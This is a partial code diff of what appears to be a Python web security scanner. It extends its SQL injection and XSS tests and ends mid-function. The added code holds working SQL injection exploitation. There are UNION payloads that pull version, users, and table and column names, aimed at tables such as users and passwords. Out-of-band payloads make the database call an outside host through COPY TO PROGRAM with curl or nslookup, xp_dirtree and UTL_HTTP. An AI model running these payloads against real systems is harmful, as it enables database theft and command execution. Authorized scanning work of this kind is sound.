-            body.setdefault(name, _fallback_value_for_param(name))
+    if target is not None:
+        for name in base_params:
+            if nested:
+                if not _has_nested_key(target, name):
+                    _set_nested_value(target, name, _fallback_value_for_param(name), overwrite=False)
+            else:
+                target.setdefault(name, _fallback_value_for_param(name))
 
     if param:
-        if nested:
-            if not _has_nested_key(body, param):
-                _set_nested_value(body, param, defaults.get(param, _fallback_value_for_param(param)), overwrite=True)
-        else:
-            body.setdefault(param, defaults.get(param, _fallback_value_for_param(param)))
+        if target is not None:
+            if nested:
+                if not _has_nested_key(target, param):
+                    _set_nested_value(target, param, defaults.get(param, _fallback_value_for_param(param)), overwrite=True)
+            else:
+                target.setdefault(param, defaults.get(param, _fallback_value_for_param(param)))
 
     return body
 
@@ -2468,7 +2878,7 @@ async def _detect_dbms_post(
     content_type: str,
     auth_args: list,
     method: str = "POST",
-    base_body: dict | None = None,
+    base_body: Any | None = None,
 ) -> dict:
     """Detect DBMS via POST/PUT/PATCH request with error-inducing payload.
 
@@ -2481,8 +2891,19 @@ async def _detect_dbms_post(
         base_body: Other params to include with benign values
     """
     # Build body with all params (benign values) + injected param
-    test_body = dict(base_body) if base_body else {}
-    test_body[param] = "1'"
+    if isinstance(base_body, list):
+        if "json" not in content_type.lower():
+            return {"detected": None}
+        test_body = copy.deepcopy(base_body)
+        if not test_body:
+            test_body = [{}] if param != "__item__" else ["1'"]
+        if isinstance(test_body[0], dict):
+            test_body[0][param] = "1'"
+        else:
+            test_body[0] = "1'"
+    else:
+        test_body = dict(base_body) if base_body else {}
+        test_body[param] = "1'"
 
     body_args, header_args = _build_curl_body_args(test_body, content_type)
 
@@ -2508,7 +2929,9 @@ async def smart_sqli_test(
     url: str,
     endpoints: list[dict],
     dbms: str | None = None,
-    auth_session: Any | None = None
+    auth_session: Any | None = None,
+    max_endpoints: int = 50,
+    max_params_per_endpoint: int = 5
 ) -> dict:
     """
     SQLi testing with DBMS-aware payload selection.
@@ -2522,6 +2945,8 @@ async def smart_sqli_test(
         endpoints: List of endpoints with params/body_params to test
         dbms: Pre-detected DBMS (or None to auto-detect)
         auth_session: AuthSession for authenticated requests (optional)
+        max_endpoints: Max endpoints to test per method (GET/POST) (default 50, thorough: 100)
+        max_params_per_endpoint: Max params to test per endpoint (default 5, thorough: 10)
 
     Returns:
         Dict with findings and DBMS info
@@ -2532,12 +2957,28 @@ async def smart_sqli_test(
         "findings": [],
         "dbms_detected": dbms,
         "endpoints_tested": 0,
+        "params_tested": 0,
         "vulnerabilities_found": 0,
         "get_endpoints_tested": 0,
         "post_endpoints_tested": 0,
     }
 
     auth_args = get_auth_curl_args(auth_session)
+
+    def _apply_body_param(body: Any, param: str, value: Any) -> Any:
+        """Return a copy of body with param injected (supports dict or list bodies)."""
+        if isinstance(body, list):
+            new_body = copy.deepcopy(body)
+            if not new_body:
+                new_body = [{}] if param != "__item__" else [value]
+            if isinstance(new_body[0], dict):
+                new_body[0][param] = value
+            else:
+                new_body[0] = value
+            return new_body
+        new_body = dict(body) if body else {}
+        new_body[param] = value
+        return new_body
 
     # Separate GET and POST endpoints to ensure both get tested
     def _method_allowed(endpoint: dict[str, Any], method: str) -> bool:
@@ -2559,8 +3000,8 @@ async def smart_sqli_test(
         and _method_allowed(e, e.get("method", "GET").upper())
     ]
 
-    # Test GET endpoints (limit to 25)
-    for endpoint in get_endpoints[:25]:
+    # Test GET endpoints
+    for endpoint in get_endpoints[:max_endpoints]:
         endpoint_url = endpoint.get("url", "")
         params = endpoint.get("params", []) or endpoint.get("query_params", [])
         param_defaults = endpoint.get("param_defaults") or endpoint.get("query_param_defaults") or {}
@@ -2582,7 +3023,8 @@ async def smart_sqli_test(
         dbms_key = results["dbms_detected"] or "generic"
         payloads = DBMS_SQLI_PAYLOADS.get(dbms_key, DBMS_SQLI_PAYLOADS["generic"])
 
-        for param in params[:5]:  # Test first 5 params per endpoint
+        for param in params[:max_params_per_endpoint]:
+            results["params_tested"] += 1
             # Get baseline
             parsed = urllib.parse.urlparse(endpoint_url)
             baseline_params = dict(urllib.parse.parse_qsl(parsed.query))
@@ -2638,7 +3080,7 @@ async def smart_sqli_test(
                 )
 
                 if is_vulnerable:
-                    results["findings"].append({
+                    finding_dict = {
                         "type": "SQLi",
                         "method": "GET",
                         "url": endpoint_url,
@@ -2649,12 +3091,16 @@ async def smart_sqli_test(
                         "evidence": evidence,
                         "confidence": 0.9 if len(evidence) > 1 else 0.7,
                         "severity": "critical" if "schema" in technique else "high",
-                    })
+                    }
+                    request_headers = _headers_from_curl_args(auth_args)
+                    if request_headers:
+                        finding_dict["request_headers"] = request_headers
+                    results["findings"].append(finding_dict)
                     results["vulnerabilities_found"] += 1
                     break  # One confirmed SQLi per param is enough
 
-    # Test POST endpoints (limit to 25)
-    for endpoint in post_endpoints[:25]:
+    # Test POST endpoints
+    for endpoint in post_endpoints[:max_endpoints]:
         endpoint_url = endpoint.get("url", "")
         method = endpoint.get("method", "POST").upper()
         body_params = endpoint.get("body_params", [])
@@ -2668,6 +3114,9 @@ async def smart_sqli_test(
 
         base_body = _build_body_template(endpoint)
         auth_post_args = _filter_curl_headers(auth_args, {"content-type"})
+        is_array_body = isinstance(base_body, list)
+        if is_array_body and "json" not in content_type.lower():
+            continue
 
         # Detect DBMS via POST/PUT/PATCH if not known yet
         if not results["dbms_detected"] and body_params:
@@ -2687,15 +3136,31 @@ async def smart_sqli_test(
         dbms_key = results["dbms_detected"] or "generic"
         payloads = DBMS_SQLI_PAYLOADS.get(dbms_key, DBMS_SQLI_PAYLOADS["generic"])
 
-        print(f"[sqli] Testing {method} endpoint: {endpoint_url} with params: {body_params[:5]}", file=sys.stderr)
+        print(f"[sqli] Testing {method} endpoint: {endpoint_url} with params: {body_params[:max_params_per_endpoint]}", file=sys.stderr)
 
-        for param in body_params[:5]:  # Test first 5 body params
+        for param in body_params[:max_params_per_endpoint]:
+            results["params_tested"] += 1
             # Build baseline for THIS param
-            baseline_body = dict(base_body)
-            if param not in baseline_body:
-                baseline_body[param] = _fallback_value_for_param(param)
-            if isinstance(baseline_body[param], str):
-                baseline_body[param] = f"{baseline_body[param]}{random.randint(1000, 9999)}"
+            if is_array_body:
+                baseline_body = copy.deepcopy(base_body)
+                if not baseline_body:
+                    baseline_body = [{}] if param != "__item__" else [""]
+                if isinstance(baseline_body[0], dict):
+                    if param not in baseline_body[0]:
+                        baseline_body[0][param] = _fallback_value_for_param(param)
+                    if isinstance(baseline_body[0][param], str):
+                        baseline_body[0][param] = f"{baseline_body[0][param]}{random.randint(1000, 9999)}"
+                else:
+                    base_val = baseline_body[0] if baseline_body else _fallback_value_for_param(param)
+                    if not isinstance(base_val, str):
+                        base_val = str(base_val)
+                    baseline_body[0] = f"{base_val}{random.randint(1000, 9999)}"
+            else:
+                baseline_body = dict(base_body) if base_body else {}
+                if param not in baseline_body:
+                    baseline_body[param] = _fallback_value_for_param(param)
+                if isinstance(baseline_body[param], str):
+                    baseline_body[param] = f"{baseline_body[param]}{random.randint(1000, 9999)}"
 
             baseline_body_args, baseline_header_args = _build_curl_body_args(baseline_body, content_type)
             baseline_start = time.time()
@@ -2718,8 +3183,7 @@ async def smart_sqli_test(
 
             # Test payloads for THIS param
             for payload, technique, description in payloads:
-                test_body = dict(baseline_body)
-                test_body[param] = payload
+                test_body = _apply_body_param(baseline_body, param, payload)
                 test_body_args, test_header_args = _build_curl_body_args(test_body, content_type)
 
                 start_time = time.time()
@@ -2740,10 +3204,9 @@ async def smart_sqli_test(
                 true_condition_len = None
                 if "boolean" in technique:
                     # Test the inverse/true condition for comparison
-                    true_body = dict(baseline_body)
                     true_payload = payload.replace("1=2", "1=1").replace("'1'='2", "'1'='1")
                     if true_payload != payload:  # Only if we actually have a false->true transform
-                        true_body[param] = true_payload
+                        true_body = _apply_body_param(baseline_body, param, true_payload)
                         true_body_args, true_header_args = _build_curl_body_args(true_body, content_type)
                         true_cmd = [
                             "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "15",
@@ -2764,7 +3227,11 @@ async def smart_sqli_test(
                 )
 
                 if is_vulnerable:
-                    results["findings"].append({
+                    request_headers = _headers_from_curl_args(auth_args)
+                    if method in ("POST", "PUT", "PATCH") and content_type:
+                        request_headers.setdefault("Content-Type", content_type)
+
+                    finding_dict = {
                         "type": "SQLi",
                         "method": method,
                         "url": endpoint_url,
@@ -2775,10 +3242,303 @@ async def smart_sqli_test(
                         "evidence": evidence,
                         "confidence": 0.9 if len(evidence) > 1 else 0.7,
                         "severity": "critical" if "schema" in technique else "high",
-                    })
+                    }
+                    # Include content_type and original body for POST verification replay
+                    if method in ("POST", "PUT", "PATCH"):
+                        finding_dict["content_type"] = content_type
+                        # Store baseline body (without the injected payload) for replay
+                        finding_dict["body"] = json.dumps(base_body) if "json" in content_type.lower() else urllib.parse.urlencode(base_body)
+                    if request_headers:
+                        finding_dict["request_headers"] = request_headers
+                    results["findings"].append(finding_dict)
                     results["vulnerabilities_found"] += 1
                     print(f"[sqli] {method} SQLi FOUND in {endpoint_url} param={param}", file=sys.stderr)
                     break  # One confirmed SQLi per param is enough
+
+    return results
+
+
+# DBMS-specific data extraction payloads for SQLi chaining
+SQLI_EXTRACTION_PAYLOADS = {
+    "mysql": {
+        "version": "' UNION SELECT NULL,@@version,NULL-- -",
+        "user": "' UNION SELECT NULL,user(),NULL-- -",
+        "database": "' UNION SELECT NULL,database(),NULL-- -",
+        "tables": "' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- -",
+        "columns": "' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='{table}'-- -",
+    },
+    "postgresql": {
+        "version": "' UNION SELECT NULL,version(),NULL--",
+        "user": "' UNION SELECT NULL,current_user,NULL--",
+        "database": "' UNION SELECT NULL,current_database(),NULL--",
+        "tables": "' UNION SELECT NULL,string_agg(tablename,','),NULL FROM pg_tables WHERE schemaname='public'--",
+        "columns": "' UNION SELECT NULL,string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='{table}'--",
+    },
+    "sqlite": {
+        "version": "' UNION SELECT NULL,sqlite_version(),NULL--",
+        "tables": "' UNION SELECT NULL,GROUP_CONCAT(name),NULL FROM sqlite_master WHERE type='table'--",
+        "columns": "' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE name='{table}'--",
+    },
+    "mssql": {
+        "version": "' UNION SELECT NULL,@@version,NULL--",
+        "user": "' UNION SELECT NULL,SYSTEM_USER,NULL--",
+        "database": "' UNION SELECT NULL,DB_NAME(),NULL--",
+        "tables": "' UNION SELECT NULL,STRING_AGG(name,','),NULL FROM sysobjects WHERE xtype='U'--",
+    },
+}
+
+
+async def sqli_data_extraction(
+    sqli_finding: dict,
+    auth_session: Any | None = None,
+    max_extractions: int = 5
+) -> dict:
+    """
+    Attempt to extract actual data after confirming SQL injection.
+
+    This function chains from a confirmed SQLi finding to extract:
+    1. Database version/user info (proof of exploitation)
+    2. Table names
+    3. Column names for interesting tables
+    4. Sample data (if safe)
+
+    Args:
+        sqli_finding: A confirmed SQLi finding from smart_sqli_test
+        auth_session: AuthSession for authenticated requests
+        max_extractions: Maximum number of extraction attempts
+
+    Returns:
+        Dict with extracted data and evidence
+    """
+    results = {
+        "extraction_successful": False,
+        "extracted_data": {},
+        "evidence": [],
+        "dbms_confirmed": None,
+        "tables_found": [],
+        "columns_found": {},
+    }
+
+    url = sqli_finding.get("url", "")
+    param = sqli_finding.get("param", "")
+    dbms = sqli_finding.get("dbms", "mysql")  # Default to MySQL
+    method = sqli_finding.get("method", "GET")
+
+    if not url or not param:
+        return results
+
+    auth_args = get_auth_curl_args(auth_session)
+    extraction_payloads = SQLI_EXTRACTION_PAYLOADS.get(dbms, SQLI_EXTRACTION_PAYLOADS["mysql"])
+
+    print(f"[sqli-extract] Attempting data extraction from {url} param={param} dbms={dbms}", file=sys.stderr)
+
+    async def send_payload(payload: str) -> tuple[str, int]:
+        """Send a payload and return (body, status_code)."""
+        parsed = urllib.parse.urlparse(url)
+
+        if method == "GET":
+            query_params = dict(urllib.parse.parse_qsl(parsed.query))
+            query_params[param] = payload
+            test_query = urllib.parse.urlencode(query_params)
+            test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))
+
+            cmd = [
+                "curl", "-sS", "-L", "-k", "--max-time", "15",
+                "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
+            ] + auth_args + ["-w", f"\n{_CURL_STATUS_MARKER}%{{http_code}}", test_url]
+        else:
+            # POST method
+            test_url = url
+            body_data = {param: payload}
+            cmd = [
+                "curl", "-sS", "-L", "-k", "--max-time", "15", "-X", method,
+                "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
+                "-H", "Content-Type: application/json",
+                "-d", json.dumps(body_data),
+            ] + auth_args + ["-w", f"\n{_CURL_STATUS_MARKER}%{{http_code}}", test_url]
+
+        out, _, rc = await run(cmd, timeout=20)
+        if rc != 0 or not out:
+            return "", 0
+
+        body, status = _parse_curl_body_status(out)
+        return body or "", status or 0
+
+    # Try to extract database version
+    if "version" in extraction_payloads:
+        body, status = await send_payload(extraction_payloads["version"])
+        if status == 200 and body:
+            # Look for version patterns in response
+            version_patterns = [
+                r"(\d+\.\d+\.\d+[-\w]*)",  # Generic version pattern
+                r"MySQL\s+(\d+\.\d+\.\d+)",
+                r"PostgreSQL\s+(\d+\.\d+)",
+                r"Microsoft\s+SQL\s+Server\s+(\d+)",
+                r"SQLite\s+(\d+\.\d+\.\d+)",
+            ]
+            for pattern in version_patterns:
+                match = re.search(pattern, body, re.I)
+                if match:
+                    results["extracted_data"]["version"] = match.group(1)
+                    results["dbms_confirmed"] = dbms
+                    results["extraction_successful"] = True
+                    results["evidence"].append(f"Extracted version: {match.group(1)}")
+                    break
+
+    # Try to extract current user
+    if "user" in extraction_payloads and results["extraction_successful"]:
+        body, status = await send_payload(extraction_payloads["user"])
+        if status == 200 and body:
+            # Look for user patterns
+            user_patterns = [
+                r"root@[\w.-]+",
+                r"[\w]+@[\w.-]+",
+                r"(?:user|admin|dbo|postgres)(?:@[\w.-]+)?",
+            ]
+            for pattern in user_patterns:
+                match = re.search(pattern, body, re.I)
+                if match:
+                    results["extracted_data"]["user"] = match.group(0)
+                    results["evidence"].append(f"Extracted user: {match.group(0)}")
+                    break
+
+    # Try to extract database name
+    if "database" in extraction_payloads and results["extraction_successful"]:
+        body, status = await send_payload(extraction_payloads["database"])
+        if status == 200 and body:
+            # Look for database name in response (usually a single word)
+            db_match = re.search(r'[\w_-]{2,30}', body)
+            if db_match:
+                db_name = db_match.group(0)
+                if db_name not in ["null", "NULL", "undefined", "error", "Error"]:
+                    results["extracted_data"]["database"] = db_name
+                    results["evidence"].append(f"Extracted database: {db_name}")
+
+    # Try to extract table names
+    if "tables" in extraction_payloads and results["extraction_successful"]:
+        body, status = await send_payload(extraction_payloads["tables"])
+        if status == 200 and body:
+            # Look for comma-separated table names
+            # Filter out common words that aren't table names
+            exclude_words = {"error", "null", "undefined", "true", "false", "type", "message"}
+            potential_tables = re.findall(r'\b([a-z_][a-z0-9_]{2,30})\b', body, re.I)
+            tables = [t for t in potential_tables if t.lower() not in exclude_words]
+
+            if tables:
+                # Deduplicate and limit
+                results["tables_found"] = list(dict.fromkeys(tables))[:20]
+                results["evidence"].append(f"Found {len(results['tables_found'])} tables")
+
+    # Try to extract columns for interesting tables
+    interesting_tables = ["users", "accounts", "credentials", "passwords", "admins", "customers"]
+    if results["tables_found"] and "columns" in extraction_payloads:
+        for table in results["tables_found"][:max_extractions]:
+            if any(interesting in table.lower() for interesting in interesting_tables):
+                payload = extraction_payloads["columns"].replace("{table}", table)
+                body, status = await send_payload(payload)
+                if status == 200 and body:
+                    columns = re.findall(r'\b([a-z_][a-z0-9_]{2,30})\b', body, re.I)
+                    if columns:
+                        results["columns_found"][table] = list(dict.fromkeys(columns))[:15]
+                        results["evidence"].append(f"Table {table}: {', '.join(columns[:5])}")
+
+    # Summarize findings
+    if results["extraction_successful"]:
+        results["severity_upgrade"] = "critical"  # Upgrade to critical with data extraction proof
+        results["proof_of_exploitation"] = True
+
+    return results
+
+
+async def oob_sqli_test(
+    url: str,
+    param: str,
+    dbms: str | None = None,
+    callback_url: str | None = None,
+    auth_session: Any | None = None
+) -> dict:
+    """
+    Test for Out-of-Band SQL injection using DNS/HTTP callbacks.
+
+    This function sends payloads that cause the database to make external
+    requests if vulnerable. Requires a callback server to detect.
+
+    Args:
+        url: Target URL
+        param: Parameter to test
+        dbms: Detected DBMS (or None for generic)
+        callback_url: URL for the callback server (e.g., Burp Collaborator)
+        auth_session: AuthSession for authenticated requests
+
+    Returns:
+        Dict with findings (requires manual callback verification)
+    """
+    results = {
+        "payloads_sent": [],
+        "requires_callback_verification": True,
+        "callback_url": callback_url,
+        "potential_oob": False,
+    }
+
+    if not callback_url:
+        # Generate a placeholder - in real use, this would be a Burp Collaborator URL
+        callback_url = "oob-test.example.com"
+        results["note"] = "No callback URL provided. Payloads sent but verification not possible."
+
+    auth_args = get_auth_curl_args(auth_session)
+
+    # OOB payloads for different DBMS
+    oob_payloads = {
+        "mysql": [
+            f"' AND LOAD_FILE('\\\\\\\\{callback_url}\\\\test')-- -",
+            f"' UNION SELECT LOAD_FILE('\\\\\\\\{callback_url}\\\\test')-- -",
+        ],
+        "postgresql": [
+            f"'; COPY (SELECT '') TO PROGRAM 'nslookup {callback_url}'--",
+            f"'; CREATE TABLE IF NOT EXISTS oob(data text); COPY oob FROM PROGRAM 'curl {callback_url}'--",
+        ],
+        "mssql": [
+            f"'; EXEC master..xp_dirtree '\\\\{callback_url}\\test'--",
+            f"'; EXEC master..xp_fileexist '\\\\{callback_url}\\test'--",
+            f"'; DECLARE @q varchar(200); SET @q='\\\\{callback_url}\\test'; EXEC master..xp_dirtree @q--",
+        ],
+        "oracle": [
+            f"' UNION SELECT UTL_HTTP.REQUEST('http://{callback_url}/') FROM dual--",
+            f"' UNION SELECT HTTPURITYPE('http://{callback_url}/').getclob() FROM dual--",
+        ],
+    }
+
+    # Get appropriate payloads
+    if dbms and dbms in oob_payloads:
+        payloads = oob_payloads[dbms]
+    else:
+        # Try all
+        payloads = []
+        for dbms_payloads in oob_payloads.values():
+            payloads.extend(dbms_payloads[:2])  # Take 2 from each
+
+    parsed = urllib.parse.urlparse(url)
+
+    for payload in payloads:
+        query_params = dict(urllib.parse.parse_qsl(parsed.query))
+        query_params[param] = payload
+        test_query = urllib.parse.urlencode(query_params)
+        test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))
+
+        cmd = [
+            "curl", "-sS", "-L", "-k", "--max-time", "15",
+            "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
+        ] + auth_args + [test_url]
+
+        await run(cmd, timeout=20)
+
+        results["payloads_sent"].append({
+            "dbms": dbms,
+            "payload": payload,
+            "callback_domain": callback_url,
+        })
+
+    results["potential_oob"] = len(results["payloads_sent"]) > 0
 
     return results
 
@@ -2852,22 +3612,35 @@ def _check_sqli_response(
         if is_vulnerable:
             break
 
-    # 2. Check for time-based injection (enhanced with tolerance)
+    # 2. Check for time-based injection (enhanced with adaptive tolerance)
     if "time" in technique:
         if baseline_status in (401, 403, 405, 415, 429):
             pass
         else:
             expected_delay = 2.0  # Payloads typically use SLEEP(2) or WAITFOR DELAY '0:0:2'
             if baseline_elapsed is None:
+                # No baseline - use simple threshold
                 if elapsed >= 2.0:
                     is_vulnerable = True
-                    evidence.append(f"Time-based delay: {elapsed:.2f}s")
+                    evidence.append(f"Time-based delay: {elapsed:.2f}s (no baseline)")
             else:
                 actual_delay = elapsed - baseline_elapsed
-                # Check if delay is close to expected (allow tolerance)
-                if 1.5 <= actual_delay <= 4.0:
+                # Adaptive tolerance based on baseline variance
+                # For fast sites (baseline < 0.5s), require closer to expected delay
+                # For slow sites (baseline > 2s), allow more tolerance
+                min_delay = max(1.5, expected_delay * 0.75)
+                max_delay = expected_delay * 2.5  # Cap at 5s for SLEEP(2)
+
+                if min_delay <= actual_delay <= max_delay:
                     is_vulnerable = True
-                    evidence.append(f"Time-based delay: {actual_delay:.2f}s (baseline {baseline_elapsed:.2f}s)")
+                    # Confidence based on how close to expected delay
+                    delay_accuracy = 1.0 - abs(actual_delay - expected_delay) / expected_delay
+                    timing_confidence = max(0.65, min(0.90, 0.75 + delay_accuracy * 0.15))
+                    evidence.append(
+                        f"Time-based delay: {actual_delay:.2f}s (baseline {baseline_elapsed:.2f}s, "
+                        f"expected ~{expected_delay}s, timing_confidence={timing_confidence:.2f})"
+                    )
+                    # Note: For higher confidence, use statistical_timing_test() with multiple samples
 
     # 3. JSON structure comparison for blind SQLi
     if baseline_body and not is_vulnerable:
@@ -2942,7 +3715,9 @@ def _check_sqli_response(
 async def smart_xss_test(
     url: str,
     endpoints: list[dict],
-    auth_session: Any | None = None
+    auth_session: Any | None = None,
+    max_endpoints: int = 50,
+    max_params_per_endpoint: int = 5
 ) -> dict:
     """
     Context-aware XSS testing.
@@ -2950,6 +3725,9 @@ async def smart_xss_test(
     Args:
         url: Base URL
         endpoints: List of endpoints with params to test
+        auth_session: AuthSession for authenticated requests (optional)
+        max_endpoints: Max endpoints to test (default 50, thorough: 100)
+        max_params_per_endpoint: Max params to test per endpoint (default 5, thorough: 10)
 
     Returns:
         Dict with XSS findings
@@ -2959,13 +3737,14 @@ async def smart_xss_test(
     results = {
         "findings": [],
         "endpoints_tested": 0,
+        "params_tested": 0,
         "reflections_found": 0,
         "vulnerabilities_found": 0,
     }
 
     auth_args = get_auth_curl_args(auth_session)
 
-    for endpoint in endpoints[:30]:  # Limit to 30 endpoints
+    for endpoint in endpoints[:max_endpoints]:
         endpoint_url = endpoint.get("url", "")
         params = endpoint.get("params", [])
         allowed = endpoint.get("allowed_methods")
@@ -2978,7 +3757,8 @@ async def smart_xss_test(
 
         results["endpoints_tested"] += 1
 
-        for param in params[:5]:  # Test first 5 params per endpoint
+        for param in params[:max_params_per_endpoint]:
+            results["params_tested"] += 1
             # Send canary to detect reflection
             canary = f"xss{random.randint(10000, 99999)}test"
 
@@ -3051,7 +3831,38 @@ async def smart_xss_test(
                         evidence.append("Angular expression evaluated: {{7*7}} = 49")
 
                 if is_vulnerable:
-                    results["findings"].append({
+                    # Determine initial severity
+                    severity = "high" if context in ["in_script", "in_angular"] else "medium"
+                    confidence = 0.85
+                    verified = False
+                    proof_data = None
+
+                    # Attempt browser proof for high-severity findings
+                    if severity == "high" and HAS_XSS_PROOF and prove_xss_headless:
+                        try:
+                            proof = await prove_xss_headless(
+                                url=endpoint_url,
+                                param=param,
+                                payload=payload,
+                                screenshot_dir=None  # Could add /tmp/xss_proofs if needed
+                            )
+                            if proof and proof.proven:
+                                verified = True
+                                confidence = proof.confidence  # 0.99 for dialog, 0.90 for console, 0.85 for DOM
+                                evidence.append(f"Browser proof: {proof.technique}")
+                                if proof.extracted_data:
+                                    evidence.append(f"Proof data: {proof.extracted_data}")
+                                proof_data = proof.to_dict()
+                            else:
+                                # Downgrade unverified high findings to medium
+                                severity = "medium"
+                                confidence = 0.65
+                                evidence.append("Browser verification attempted but no execution confirmed")
+                        except Exception as e:
+                            # Don't fail the scan if browser proof fails
+                            evidence.append(f"Browser verification skipped: {e}")
+
+                    finding = {
                         "type": "XSS",
                         "subtype": context,
                         "url": endpoint_url,
@@ -3060,13 +3871,260 @@ async def smart_xss_test(
                         "technique": technique,
                         "description": description,
                         "evidence": evidence,
-                        "confidence": 0.85,
-                        "severity": "high" if context in ["in_script", "in_angular"] else "medium",
-                    })
+                        "confidence": confidence,
+                        "severity": severity,
+                        "verified": verified,
+                    }
+                    if proof_data:
+                        finding["browser_proof"] = proof_data
+                    request_headers = _headers_from_curl_args(auth_args)
+                    if request_headers:
+                        finding["request_headers"] = request_headers
+
+                    results["findings"].append(finding)
                     results["vulnerabilities_found"] += 1
                     break  # One confirmed XSS per param is enough
 
     return results
+
+
+# DOM XSS sources and sinks for detection
+DOM_XSS_SOURCES = [
+    # URL-based sources
+    r"document\.URL",
+    r"document\.documentURI",
+    r"document\.baseURI",
+    r"location\.href",
+    r"location\.search",
+    r"location\.hash",
+    r"location\.pathname",
+    r"window\.name",
+    r"document\.referrer",
+    r"document\.cookie",
+    # Storage sources
+    r"localStorage\.getItem",
+    r"sessionStorage\.getItem",
+    r"localStorage\[",
+    r"sessionStorage\[",
+    # Message sources
+    r"postMessage",
+    r"\.data",  # from message events
+    # Other sources
+    r"history\.pushState",
+    r"history\.replaceState",
+]
+
+DOM_XSS_SINKS = [
+    # Direct execution sinks (Critical)
+    (r"eval\s*\(", "critical", "eval"),
+    (r"Function\s*\(", "critical", "Function constructor"),
+    (r"setTimeout\s*\([^,]*,", "critical", "setTimeout with string"),
+    (r"setInterval\s*\([^,]*,", "critical", "setInterval with string"),
+    (r"new\s+Function\s*\(", "critical", "new Function"),
+    # HTML sinks (High)
+    (r"\.innerHTML\s*=", "high", "innerHTML assignment"),
+    (r"\.outerHTML\s*=", "high", "outerHTML assignment"),
+    (r"document\.write\s*\(", "high", "document.write"),
+    (r"document\.writeln\s*\(", "high", "document.writeln"),
+    (r"\.insertAdjacentHTML\s*\(", "high", "insertAdjacentHTML"),
+    # jQuery sinks (High)
+    (r"\$\s*\([^)]*\)\.html\s*\(", "high", "jQuery html()"),
+    (r"\$\s*\([^)]*\)\.append\s*\(", "high", "jQuery append()"),
+    (r"\$\s*\([^)]*\)\.prepend\s*\(", "high", "jQuery prepend()"),
+    (r"\$\s*\([^)]*\)\.after\s*\(", "high", "jQuery after()"),
+    (r"\$\s*\([^)]*\)\.before\s*\(", "high", "jQuery before()"),
+    (r"\$\s*\([^)]*\)\.replaceWith\s*\(", "high", "jQuery replaceWith()"),
+    (r"jQuery\s*\([^)]*\)\.html\s*\(", "high", "jQuery html()"),
+    # URL sinks (Medium-High)
+    (r"location\s*=", "high", "location assignment"),
+    (r"location\.href\s*=", "high", "location.href assignment"),
+    (r"location\.replace\s*\(", "high", "location.replace"),
+    (r"location\.assign\s*\(", "high", "location.assign"),
+    (r"window\.open\s*\(", "medium", "window.open"),
+    # Attribute sinks (Medium)
+    (r"\.setAttribute\s*\(['\"]on", "high", "setAttribute event handler"),
+    (r"\.setAttribute\s*\(['\"]href", "medium", "setAttribute href"),
+    (r"\.setAttribute\s*\(['\"]src", "medium", "setAttribute src"),
+    (r"\.src\s*=", "medium", "src assignment"),
+    (r"\.href\s*=", "medium", "href assignment"),
+    # Script injection (Critical)
+    (r"\.script\.src\s*=", "critical", "script.src assignment"),
+    (r"createElement\s*\(['\"]script", "high", "createElement script"),
+    # React dangerouslySetInnerHTML (High)
+    (r"dangerouslySetInnerHTML", "high", "React dangerouslySetInnerHTML"),
+    # Angular bypassSecurityTrust (High)
+    (r"bypassSecurityTrust", "high", "Angular security bypass"),
+    # Vue v-html
+    (r"v-html\s*=", "high", "Vue v-html directive"),
+]
+
+
+async def dom_xss_analysis(
+    url: str,
+    js_urls: list[str] | None = None,
+    auth_session: Any | None = None,
+    max_files: int = 20
+) -> dict:
+    """
+    Analyze JavaScript files for DOM-based XSS vulnerabilities.
+
+    This function performs static analysis of JavaScript code to identify
+    potential DOM XSS vulnerabilities by looking for dangerous source-to-sink
+    data flows.
+
+    Args:
+        url: Base URL to analyze
+        js_urls: Optional list of specific JS URLs to analyze
+        auth_session: AuthSession for authenticated requests
+        max_files: Maximum number of JS files to analyze
+
+    Returns:
+        Dict with findings and analysis stats
+    """
+    results = {
+        "findings": [],
+        "files_analyzed": 0,
+        "sinks_found": 0,
+        "sources_found": 0,
+        "potential_vulns": 0,
+    }
+
+    auth_args = get_auth_curl_args(auth_session)
+
+    # If no specific JS URLs provided, try to discover them from the page
+    if not js_urls:
+        # Fetch the main page and extract JS URLs
+        cmd = [
+            "curl", "-sS", "-L", "-k", "--max-time", "15",
+            "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
+        ] + auth_args + [url]
+
+        out, _, rc = await run(cmd, timeout=20)
+        if rc != 0 or not out:
+            return results
+
+        # Extract JavaScript URLs from the page
+        js_urls = []
+        # Script src patterns
+        src_pattern = r'<script[^>]+src=["\']([^"\']+)["\']'
+        for match in re.finditer(src_pattern, out, re.I):
+            src = match.group(1)
+            if not src.startswith("data:"):
+                # Resolve relative URLs
+                if src.startswith("//"):
+                    src = "https:" + src
+                elif src.startswith("/"):
+                    parsed = urllib.parse.urlparse(url)
+                    src = f"{parsed.scheme}://{parsed.netloc}{src}"
+                elif not src.startswith("http"):
+                    parsed = urllib.parse.urlparse(url)
+                    base_path = "/".join(parsed.path.split("/")[:-1])
+                    src = f"{parsed.scheme}://{parsed.netloc}{base_path}/{src}"
+                js_urls.append(src)
+
+        # Also look for inline scripts
+        inline_pattern = r'<script[^>]*>([\s\S]*?)</script>'
+        inline_scripts = re.findall(inline_pattern, out, re.I)
+
+        # Analyze inline scripts
+        for i, script_content in enumerate(inline_scripts[:10]):  # Limit inline scripts
+            if len(script_content.strip()) > 50:  # Skip empty/tiny scripts
+                findings = _analyze_js_content(script_content, f"{url}#inline-{i}")
+                results["findings"].extend(findings)
+                if findings:
+                    results["files_analyzed"] += 1
+
+    # Analyze external JS files
+    for js_url in js_urls[:max_files]:
+        cmd = [
+            "curl", "-sS", "-L", "-k", "--max-time", "10",
+            "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
+        ] + auth_args + [js_url]
+
+        out, _, rc = await run(cmd, timeout=15)
+        if rc != 0 or not out:
+            continue
+
+        # Skip minified files that are too large (likely libraries)
+        if len(out) > 500000 and ".min." in js_url:
